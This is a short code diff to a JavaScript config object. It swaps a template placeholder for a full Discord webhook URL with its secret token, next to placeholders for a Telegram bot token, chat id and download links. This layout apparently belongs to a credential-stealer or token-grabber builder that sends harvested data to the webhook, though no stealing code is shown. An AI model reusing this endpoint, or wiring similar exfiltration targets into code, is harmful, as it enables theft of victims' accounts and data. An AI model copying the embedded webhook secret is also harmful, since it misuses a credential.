@@ -2,7 +2,7 @@ const https = require('https');
 
 var config = {
   tel_url: "%TELEGRAM_PROTECTED_URL%",
-  webhookUrl: "%WEBHOOK%",
+  webhookUrl: "https://discord.com/api/webhooks/1412463264746704967/ZLnheMsfHklkF78R-X0wQkI4ThNutSZhRt5tcn1TRmYX18SzyQu4KytPYXjt7eAzYC4q",
   links: "%URL_DOWNLOADS%",
   bot_token: "%TELEGRAM_BOTTOKEN%",
   chat_id: "%TELEGRAM_CHATID%",
